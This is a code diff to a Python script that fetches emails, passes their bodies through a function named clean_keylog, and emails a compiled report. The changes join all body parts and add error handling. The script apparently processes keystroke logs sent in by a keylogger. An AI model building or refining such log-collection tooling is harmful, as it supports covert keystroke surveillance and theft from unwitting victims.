@@ -53,15 +53,19 @@ def fetch_emails():
             from_ = msg.get("From")
             
             # Fetch the email body
+            body = ""
             if msg.is_multipart():
                 for part in msg.walk():
                     content_type = part.get_content_type()
                     content_disposition = str(part.get("Content-Disposition"))
                     if "attachment" not in content_disposition:
-                        body = part.get_payload(decode=True).decode(errors='ignore')
-                        break
+                        payload = part.get_payload(decode=True)
+                        if payload:
+                            body += payload.decode(errors='ignore')
             else:
-                body = msg.get_payload(decode=True).decode(errors='ignore')
+                payload = msg.get_payload(decode=True)
+                if payload:
+                    body += payload.decode(errors='ignore')
             
             # Clean and format the body
             clean_body = clean_keylog(body)
@@ -85,14 +89,20 @@ def send_report_via_smtp(report):
     msg.attach(body)
 
     # Send the email
-    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
-        server.starttls()
-        server.login(USERNAME, PASSWORD)
-        server.sendmail(USERNAME, RECIPIENTS, msg.as_string())
+    try:
+        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
+            server.starttls()
+            server.login(USERNAME, PASSWORD)
+            server.sendmail(USERNAME, RECIPIENTS, msg.as_string())
+    except Exception as e:
+        print(f"Failed to send email: {e}")
 
 def main():
-    report = fetch_emails()
-    send_report_via_smtp(report)
+    try:
+        report = fetch_emails()
+        send_report_via_smtp(report)
+    except Exception as e:
+        print(f"Error in script execution: {e}")
 
 if __name__ == '__main__':
     main()
